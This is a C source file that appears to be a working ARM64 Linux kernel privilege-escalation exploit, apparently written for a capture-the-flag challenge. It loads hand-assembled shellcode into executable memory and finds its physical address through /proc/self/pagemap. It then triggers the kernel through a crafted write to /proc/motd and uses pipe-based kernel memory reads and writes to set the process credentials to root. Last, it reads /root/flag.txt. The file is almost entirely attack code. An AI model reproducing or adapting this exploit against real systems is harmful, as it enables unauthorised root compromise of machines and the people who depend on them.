#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>

#define PAGEMAP_ENTRY 8
#define GET_BIT(X,Y) (X & ((uint64_t)1<<Y)) >> Y
#define GET_PFN(X) X & 0x7FFFFFFFFFFFFF

const int __endian_bit = 1;
#define is_bigendian() ( (*(char*)&__endian_bit) == 0 )
#define KERNEL_START    0xFFFFFFC000000000
#define ARRAY_SIZE(a)      (sizeof (a) / sizeof (*(a)))

int i, c, pid, status;
unsigned long virt_addr; 
uint64_t read_val, file_offset;
char path_buf [0x100] = {};
FILE * f;
char *end;

unsigned long long read_pagemap(char * path_buf, unsigned long virt_addr);

typedef unsigned long mm_segment_t;

struct thread_info *hack_stack_base = NULL;

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;

struct thread_info {
   unsigned long     flags;      /* low level flags */
   mm_segment_t      addr_limit; /* address limit */
   struct task_struct   *task;      /* main task structure */
};

struct kernel_cap_struct {
   uint32_t cap[2];
};

struct cred {
   int usage;
   uid_t uid;
   gid_t gid;
   uid_t suid;
   gid_t sgid;
   uid_t euid;
   gid_t egid;
   uid_t fsuid;
   gid_t fsgid;
   unsigned int securebits;
   struct kernel_cap_struct cap_inheritable;
   struct kernel_cap_struct cap_permitted;
   struct kernel_cap_struct cap_effective;
   struct kernel_cap_struct cap_bset;
};

struct list_head {
   struct list_head *next;
   struct list_head *prev;
};

struct task_security_struct {
   unsigned int osid;
   unsigned int sid;
   unsigned int exec_sid;
   unsigned int create_sid;
   unsigned int keycreate_sid;
   unsigned int sockcreate_sid;
};


struct task_struct_partial {
   struct list_head cpu_timers[3]; 
   struct cred *real_cred;
   struct cred *cred;
   char comm[16];
};

ssize_t 
readmem(const void *src, void *dest, size_t count)
{
   int pipefd[2];
   ssize_t len;

   pipe(pipefd);

   len = write(pipefd[1], src, count);

   if (len != count) {
      printf("FAILED READ @ %p : %d %d\n", src, (int)len, errno);
      while (1) {
         sleep(10);
      }
   }

   read(pipefd[0], dest, count);

   close(pipefd[0]);
   close(pipefd[1]);

   return len;
}

ssize_t 
writemem(void *dest, const void *src, size_t count)
{
   int pipefd[2];
   ssize_t len;

   pipe(pipefd);

   write(pipefd[1], src, count);
   len = read(pipefd[0], dest, count);

   if (len != count) {
      printf("FAILED WRITE @ %p : %d %d\n", dest, (int)len, errno);
      while (1) {
         sleep(10);
      }
   }

   close(pipefd[0]);
   close(pipefd[1]);

   return len;
}

void rooting()
{
   struct thread_info stackbuf;
   readmem(hack_stack_base, &stackbuf, sizeof(stackbuf));

   struct cred *cred;
   struct cred credbuf;
   unsigned long taskbuf[0x100];
   int i;

   readmem(stackbuf.task, taskbuf, sizeof taskbuf);

   for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
      struct task_struct_partial *task = (void *)&taskbuf[i];


      if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
       && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
       && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
       && task->real_cred == task->cred) {
         cred = task->cred;
         break;
      }
   }

   readmem(cred, &credbuf, sizeof credbuf);

   credbuf.uid = 0;
   credbuf.gid = 0;
   credbuf.suid = 0;
   credbuf.sgid = 0;
   credbuf.euid = 0;
   credbuf.egid = 0;
   credbuf.fsuid = 0;
   credbuf.fsgid = 0;

   writemem(cred, &credbuf, sizeof credbuf);

   printf("%d\n", getuid());
   system("cat /root/flag.txt");
}

int main(int argc, char ** argv){
   //printf("%lu\n", GET_BIT(0xA680000000000000, 63));
   //return 0;
   unsigned long sc;
   unsigned long long pfn;
   unsigned long sc_addr;
   unsigned long pfn_min = 0x40000;
   int fd;

   // 0x40010000
   sc = (unsigned long)mmap((void *)0x40000000, 0x11000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
   //*(unsigned int *)(sc) = 0x910003e0;
   //*(unsigned int *)(sc + 4) = 0x9273c800;
   //*(unsigned int *)(sc + 8) = 0x91002000;
   //*(unsigned int *)(sc + 12) = 0xd2800001;
   //*(unsigned int *)(sc + 16) = 0xd1000421;
   //*(unsigned int *)(sc + 20) = 0xf9000001;

   unsigned int *data = (unsigned int *)(sc);
data[0] = 0xd10023ff;
data[1] = 0xf90003e0;
data[2] = 0x910003e0;
data[3] = 0x9272c400;
data[4] = 0x91002000;
data[5] = 0xd2800001;
data[6] = 0xd1000421;
data[7] = 0xf9000001;
data[8] = 0x910003e1;
data[9] = 0xd2800800;
data[10] = 0xd378dc00;
data[11] = 0x91000400;
data[12] = 0xd378dc00;
data[13] = 0xd378dc00;
data[14] = 0xf9000001;
data[15] = 0xd2801fe0;
data[16] = 0xd378dc00;
data[17] = 0x9103fc00;
data[18] = 0xd378dc00;
data[19] = 0x9103fc00;
data[20] = 0xd378dc00;
data[21] = 0x91030000;
data[22] = 0xd378dc00;
data[23] = 0x91000000;
data[24] = 0xd378dc00;
data[25] = 0x91005800;
data[26] = 0xd378dc00;
data[27] = 0x91008800;
data[28] = 0xd378dc00;
data[29] = 0x9100a000;
data[30] = 0xaa0003fe;
data[31] = 0xf94003e0;
data[32] = 0x910023ff;
data[33] = 0xd65f03c0;


   mlock(sc, 0x11000);

   sprintf(path_buf, "/proc/self/pagemap");
   pfn = read_pagemap(path_buf, sc);

   sc_addr = 0xFFFFFFC000000000 + 4096 * (pfn - pfn_min);

   char buf[100];
   memset(buf, -1, sizeof(buf));

   buf[16] = (char)(sc_addr & 0xff);
   buf[17] = (char)((sc_addr >> 8) & 0xff);
   buf[18] = (char)((sc_addr >> 16) & 0xff);
   buf[19] = (char)((sc_addr >> 24) & 0xff);
   buf[20] = (char)((sc_addr >> 32) & 0xff);
   buf[21] = (char)((sc_addr >> 40) & 0xff);
   buf[22] = (char)((sc_addr >> 48) & 0xff);
   buf[23] = (char)((sc_addr >> 56) & 0xff);

   printf("sc_addr: %llx\n", sc_addr);
   printf("buf: %llx\n", *(unsigned long *)((void *)buf + 16));

   fd = open("/proc/motd", O_RDWR);
   write(fd, buf, 24);
   close(fd);

   unsigned long sp = *(unsigned long *)(0x40010000);

   printf("Stack: 0x%lx\n", sp);
   hack_stack_base = (struct thread_info *)(sp & (0xffffffffffffc000));

   printf("Hello World\n");
   rooting();
   //buf[16] = sc_addr
   return 0;
}

/*
credit: http://fivelinesofcode.blogspot.com/2014/03/how-to-translate-virtual-to-physical.html
*/
unsigned long long read_pagemap(char * path_buf, unsigned long virt_addr){
   //printf("Big endian? %d\n", is_bigendian());
   unsigned long long pfn;
   f = fopen(path_buf, "rb");
   if(!f){
      printf("Error! Cannot open %s\n", path_buf);
      return -1;
   }
   
   //Shifting by virt-addr-offset number of bytes
   //and multiplying by the size of an address (the size of an entry in pagemap file)
   file_offset = virt_addr / getpagesize() * PAGEMAP_ENTRY;
   printf("Vaddr: 0x%lx, Page_size: %d, Entry_size: %d\n", virt_addr, getpagesize(), PAGEMAP_ENTRY);
   printf("Reading %s at 0x%llx\n", path_buf, (unsigned long long) file_offset);
   status = fseek(f, file_offset, SEEK_SET);
   if(status){
      perror("Failed to do fseek!");
      return -1;
   }
   errno = 0;
   read_val = 0;
   unsigned char c_buf[PAGEMAP_ENTRY];
   for(i=0; i < PAGEMAP_ENTRY; i++){
      c = getc(f);
      if(c==EOF){
         printf("\nReached end of the file\n");
         return 0;
      }
      if(is_bigendian())
           c_buf[i] = c;
      else
           c_buf[PAGEMAP_ENTRY - i - 1] = c;
      printf("[%d]0x%x ", i, c);
   }
   for(i=0; i < PAGEMAP_ENTRY; i++){
      //printf("%d ",c_buf[i]);
      read_val = (read_val << 8) + c_buf[i];
   }
   printf("\n");
   printf("Result: 0x%llx\n", (unsigned long long) read_val);
   //if(GET_BIT(read_val, 63))
   if(GET_BIT(read_val, 63)) {
      pfn = GET_PFN(read_val);
      printf("PFN: 0x%llx\n",(unsigned long long) GET_PFN(read_val));
   }
   else
      printf("Page not present\n");
   if(GET_BIT(read_val, 62))
      printf("Page swapped\n");
   fclose(f);
   return pfn;
}